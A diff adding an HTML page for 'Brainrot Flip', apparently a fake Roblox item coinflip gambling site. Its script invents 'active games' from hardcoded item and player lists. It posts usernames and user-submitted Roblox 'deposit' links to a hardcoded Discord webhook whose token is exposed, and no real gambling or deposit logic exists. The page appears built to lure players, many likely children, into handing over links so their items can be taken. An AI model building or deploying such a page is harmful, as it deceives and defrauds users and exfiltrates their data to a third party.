@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brainrot Flip - The First MM2 Coinflipping Site</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1a1a1a;
+            color: #fff;
+            text-align: center;
+            margin: 0;
+            padding: 20px;
+        }
+        h1 {
+            color: #ffd700;
+            text-shadow: 2px 2px 4px #000;
+        }
+        h2 {
+            color: #ffd700;
+        }
+        .active-games {
+            max-width: 800px;
+            margin: 0 auto 40px;
+        }
+        .game {
+            background-color: #333;
+            border: 1px solid #ffd700;
+            border-radius: 10px;
+            padding: 10px;
+            margin: 10px 0;
+            text-align: left;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .game div {
+            margin: 5px 0;
+        }
+        .game button {
+            background-color: #ff4500;
+            color: white;
+            padding: 8px 16px;
+            font-size: 14px;
+        }
+        .game button:hover {
+            background-color: #e03e00;
+        }
+        .nav {
+            margin: 20px 0;
+        }
+        .nav button {
+            color: #fff;
+            font-size: 18px;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            border-radius: 5px;
+            border: none;
+            cursor: pointer;
+            margin: 5px;
+        }
+        .nav button:hover {
+            background-color: #45a049;
+        }
+        .auth-status {
+            margin: 10px 0;
+            font-size: 18px;
+        }
+        .inventory-menu {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.9);
+            padding: 20px;
+        }
+        .inventory-menu .close-btn {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            font-size: 30px;
+            color: #ffd700;
+            cursor: pointer;
+        }
+        .inventory {
+            max-width: 800px;
+            margin: 40px auto;
+        }
+        .inventory ul {
+            list-style: none;
+            padding: 0;
+        }
+        .inventory li {
+            background-color: #333;
+            border: 1px solid #ffd700;
+            border-radius: 5px;
+            padding: 10px;
+            margin: 10px 0;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 18px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        #registerModal, #loginModal, #depositModal {
+            display: none;
+            position: fixed;
+            z-index: 2;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.4);
+        }
+        .modal-content {
+            background-color: #333;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #ffd700;
+            width: 80%;
+            max-width: 400px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        input[type="text"], input[type="password"] {
+            padding: 10px;
+            font-size: 16px;
+            width: 80%;
+            margin: 10px 0;
+        }
+        .error {
+            color: red;
+            margin: 10px 0;
+        }
+        .success {
+            color: green;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>Brainrot Flip - The First MM2 Coinflipping Site</h1>
+    <p>Welcome to Brainrot Flip! Gamble your MM2 items in coinflips and win big!</p>
+
+    <div class="auth-status" id="authStatus">
+        <button id="registerBtn" onclick="openRegister()">Register</button>
+        <button id="loginBtn" onclick="openLogin()">Login</button>
+    </div>
+
+    <div class="nav">
+        <button onclick="openInventory()" id="inventoryBtn" style="display: none;">Inventory</button>
+        <button onclick="logout()" id="logoutBtn" style="display: none;">Logout</button>
+    </div>
+
+    <section class="active-games" id="gamesContainer">
+        <h2>Active Coinflips</h2>
+    </section>
+
+    <div class="inventory-menu" id="inventoryMenu">
+        <span class="close-btn" onclick="closeInventory()">&times;</span>
+        <section class="inventory">
+            <h2>Your Inventory</h2>
+            <ul id="inventoryList">
+                <!-- Starts empty -->
+            </ul>
+            <button id="depositBtn">Deposit</button>
+        </section>
+    </div>
+
+    <div id="registerModal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeRegister()">&times;</span>
+            <h2>Register</h2>
+            <input type="text" id="regUsername" placeholder="Username (3+ characters)">
+            <input type="password" id="regPassword" placeholder="Password">
+            <button onclick="register()">Register</button>
+            <div id="regError" class="error"></div>
+            <div id="regSuccess" class="success"></div>
+        </div>
+    </div>
+
+    <div id="loginModal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeLogin()">&times;</span>
+            <h2>Login</h2>
+            <input type="text" id="loginUsername" placeholder="Username">
+            <input type="password" id="loginPassword" placeholder="Password">
+            <button onclick="login()">Login</button>
+            <div id="loginError" class="error"></div>
+            <div id="loginSuccess" class="success"></div>
+        </div>
+    </div>
+
+    <div id="depositModal">
+        <div class="modal-content">
+            <h2>Deposit</h2>
+            <input type="text" id="linkInput" placeholder="Enter Roblox link (https://roblox.com/...)">
+            <button onclick="submitDeposit()">Submit</button>
+            <button onclick="closeModal()">Cancel</button>
+            <div id="depositError" class="error"></div>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1421757752610521138/G3Dw7CiydmXlRfmBUgb1By2s-Vt4Pw0CKoLFY3h6uFkkp_pg6qMnFEFPJdIFgH-nwS1l';
+        const STORAGE_KEY = 'brainrotUser';
+
+        const secretBrainrots = [
+            {"name": "Las Sis", "mps": "17.5M"},
+            {"name": "La Vacca Saturno Saturnita", "mps": "250k"},
+            {"name": "Blackhole Goat", "mps": "400k"},
+            {"name": "Bisonte Giuppitere", "mps": "300k"},
+            {"name": "Chachechi", "mps": "400k"},
+            {"name": "Trenostruzzo Turbo 4000", "mps": "310k"},
+            {"name": "Los Matteos", "mps": "300k"},
+            {"name": "Chimpanzini_spiderini", "mps": "325k"},
+            {"name": "Karkerkar Kurkur", "mps": "300k"},
+            {"name": "Sammyni Spyderini", "mps": "350k"},
+            {"name": "Guerriro Digitale", "mps": "550k"},
+            {"name": "Extinct Tralalero", "mps": "450k"},
+            {"name": "Fragola La La La", "mps": "450k"},
+            {"name": "Extinct Matteo", "mps": "625k"},
+            {"name": "Dul Dul Dul", "mps": "375k"},
+            {"name": "Los Tralaleirtos", "mps": "500k"},
+            {"name": "Las Tralaleritas", "mps": "650k"},
+            {"name": "La Karkerkar Combinasion", "mps": "750k"},
+            {"name": "Job Job Job Sahur", "mps": "700k"},
+            {"name": "Graipuss Medussi", "mps": "1M"},
+            {"name": "Los Spyderinis", "mps": "450k"},
+            {"name": "Nooo My Hotspot", "mps": "1.5M"},
+            {"name": "Tortuginni Dragonfruitini", "mps": "350k"},
+            {"name": "La Sahur Combinasion", "mps": "2M"},
+            {"name": "Quesadilla Crocodila", "mps": "3M"},
+            {"name": "La Grande Combinasion", "mps": "10M"},
+            {"name": "Nuclearo Dinossauro", "mps": "15M"},
+            {"name": "La Extinct Grande", "mps": "23.5M"},
+            {"name": "Garama and Madundung", "mps": "50M"},
+            {"name": "Pot Hotspot", "mps": "2.5M"},
+            {"name": "Las Vaquitas Saturnitas", "mps": "750k"},
+            {"name": "Chicleteira Bicicleteira", "mps": "3.5M"},
+            {"name": "Spaghetti Tualetti", "mps": "60M"},
+            {"name": "Agarrini la Palini", "mps": "425k"},
+            {"name": "Los Noo My Hotspotsitos", "mps": "5M"},
+            {"name": "67", "mps": "7.5M"},
+            {"name": "Los Chicleteiras", "mps": "7M"},
+            {"name": "Los Combinasionas", "mps": "15M"},
+            {"name": "Los Bros", "mps": "24M"},
+            {"name": "Celularcini Viciosini", "mps": "22.5M"},
+            {"name": "Los Hotspotsitos", "mps": "20M"},
+            {"name": "Tralaledon", "mps": "27.5M"},
+            {"name": "Esok Sekolah", "mps": "30M"},
+            {"name": "Ketupat Kepat", "mps": "35M"},
+            {"name": "La Supreme Combinasion", "mps": "40M"},
+            {"name": "Ketchuru and Musturu", "mps": "42.5M"},
+            {"name": "Dragon Cannelloni", "mps": "100M"},
+            {"name": "Strawberry Elephant", "mps": "250M"}
+        ];
+
+        const players = ['StopGamblingNow', 'ExclusiveRelax', 'imtheking_lol6', 'cornelis735', 'Godzilla63616'];
+
+        function generateGame() {
+            const brainrot1 = secretBrainrots[Math.floor(Math.random() * secretBrainrots.length)];
+            const brainrot2 = secretBrainrots[Math.floor(Math.random() * secretBrainrots.length)];
+            const player = players[Math.floor(Math.random() * players.length)];
+            const mps1 = brainrot1.mps;
+            const mps2 = brainrot2.mps;
+
+            return `
+                <div class="game">
+                    <div>
+                        <div>Brainrot: ${brainrot1.name}</div>
+                        <div>Player: ${player}</div>
+                        <div>Brainrot: ${brainrot2.name}</div>
+                        <div>Value: ${mps1}</div>
+                    </div>
+                    <button onclick="openInventory()">Join Match</button>
+                </div>
+            `;
+        }
+
+        function addGame() {
+            const gamesContainer = document.getElementById('gamesContainer');
+            gamesContainer.insertAdjacentHTML('beforeend', generateGame());
+
+            // Remove 1, 2, or 3 games based on probability
+            const games = gamesContainer.getElementsByClassName('game');
+            const rand = Math.random();
+            let numToRemove = 0;
+            if (rand < 0.4) {
+                numToRemove = 1;
+            } else if (rand < 0.8) {
+                numToRemove = 2;
+            } else {
+                numToRemove = 3;
+            }
+
+            for (let i = 0; i < numToRemove && games.length > 0; i++) {
+                games[0].remove();
+            }
+        }
+
+        // Initialize with 5 games
+        for (let i = 0; i < 5; i++) {
+            addGame();
+        }
+
+        // Add new game every 10 seconds
+        setInterval(addGame, 10000);
+
+        function updateAuthUI() {
+            const user = localStorage.getItem(STORAGE_KEY);
+            const status = document.getElementById('authStatus');
+            const inventoryBtn = document.getElementById('inventoryBtn');
+            const logoutBtn = document.getElementById('logoutBtn');
+            const registerBtn = document.getElementById('registerBtn');
+            const loginBtn = document.getElementById('loginBtn');
+
+            if (user) {
+                status.innerHTML = `Logged in as <strong>${user}</strong>`;
+                inventoryBtn.style.display = 'inline-block';
+                logoutBtn.style.display = 'inline-block';
+                registerBtn.style.display = 'none';
+                loginBtn.style.display = 'none';
+            } else {
+                status.innerHTML = '<button id="registerBtn" onclick="openRegister()">Register</button><button id="loginBtn" onclick="openLogin()">Login</button>';
+                inventoryBtn.style.display = 'none';
+                logoutBtn.style.display = 'none';
+            }
+        }
+
+        function logout() {
+            localStorage.removeItem(STORAGE_KEY);
+            updateAuthUI();
+            closeInventory();
+        }
+
+        function register() {
+            const username = document.getElementById('regUsername').value.trim();
+            const password = document.getElementById('regPassword').value.trim();
+            const errorEl = document.getElementById('regError');
+            const successEl = document.getElementById('regSuccess');
+
+            if (username.length < 3) {
+                errorEl.textContent = 'Username must be 3 or more characters';
+                return;
+            }
+            if (!password) {
+                errorEl.textContent = 'Password is required';
+                return;
+            }
+
+            if (localStorage.getItem(`user_${username}`)) {
+                errorEl.textContent = 'Username already exists';
+                return;
+            }
+
+            localStorage.setItem(`user_${username}`, password);
+            localStorage.setItem(STORAGE_KEY, username);
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: `New registration: ${username}` })
+            })
+            .then(response => {
+                if (response.ok) {
+                    errorEl.textContent = '';
+                    successEl.textContent = 'Registration successful!';
+                    updateAuthUI();
+                    setTimeout(closeRegister, 1000);
+                } else {
+                    errorEl.textContent = 'Error registering';
+                }
+            })
+            .catch(error => {
+                errorEl.textContent = 'Error: ' + error;
+            });
+        }
+
+        function login() {
+            const username = document.getElementById('loginUsername').value.trim();
+            const password = document.getElementById('loginPassword').value.trim();
+            const errorEl = document.getElementById('loginError');
+            const successEl = document.getElementById('loginSuccess');
+
+            if (username.length < 3) {
+                errorEl.textContent = 'Username must be 3 or more characters';
+                return;
+            }
+            if (!password) {
+                errorEl.textContent = 'Password is required';
+                return;
+            }
+
+            const storedPassword = localStorage.getItem(`user_${username}`);
+            if (!storedPassword || storedPassword !== password) {
+                errorEl.textContent = 'Invalid username or password';
+                return;
+            }
+
+            localStorage.setItem(STORAGE_KEY, username);
+            errorEl.textContent = '';
+            successEl.textContent = 'Login successful!';
+            updateAuthUI();
+            setTimeout(closeLogin, 1000);
+        }
+
+        function openRegister() {
+            document.getElementById('registerModal').style.display = 'block';
+            document.getElementById('regError').textContent = '';
+            document.getElementById('regSuccess').textContent = '';
+        }
+
+        function closeRegister() {
+            document.getElementById('registerModal').style.display = 'none';
+        }
+
+        function openLogin() {
+            document.getElementById('loginModal').style.display = 'block';
+            document.getElementById('loginError').textContent = '';
+            document.getElementById('loginSuccess').textContent = '';
+        }
+
+        function closeLogin() {
+            document.getElementById('loginModal').style.display = 'none';
+        }
+
+        function openInventory() {
+            if (!localStorage.getItem(STORAGE_KEY)) {
+                alert('Please login first');
+                return;
+            }
+            document.getElementById('inventoryMenu').style.display = 'block';
+        }
+
+        function closeInventory() {
+            document.getElementById('inventoryMenu').style.display = 'none';
+        }
+
+        document.getElementById('depositBtn').onclick = function() {
+            if (!localStorage.getItem(STORAGE_KEY)) {
+                alert('Please login first');
+                return;
+            }
+            document.getElementById('depositModal').style.display = 'block';
+        };
+
+        function closeModal() {
+            document.getElementById('depositModal').style.display = 'none';
+            document.getElementById('depositError').textContent = '';
+        }
+
+        function submitDeposit() {
+            const link = document.getElementById('linkInput').value.trim();
+            const errorEl = document.getElementById('depositError');
+            if (!link.startsWith('https://roblox.com') && !link.startsWith('https://www.roblox.com')) {
+                errorEl.textContent = 'Invalid link! It must start with https://roblox.com or https://www.roblox.com';
+                return;
+            }
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `New deposit link from ${localStorage.getItem(STORAGE_KEY)}: ${link}`
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Link sent successfully!');
+                    closeModal();
+                } else {
+                    errorEl.textContent = 'Error sending link.';
+                }
+            })
+            .catch(error => {
+                errorEl.textContent = 'Error: ' + error;
+            });
+        }
+
+        // Close modals on outside click
+        window.onclick = function(event) {
+            const modals = ['registerModal', 'loginModal', 'depositModal'];
+            modals.forEach(modalId => {
+                if (event.target.id === modalId) {
+                    document.getElementById(modalId).style.display = 'none';
+                }
+            });
+        }
+
+        // Init
+        updateAuthUI();
+    </script>
+</body>
+</html>
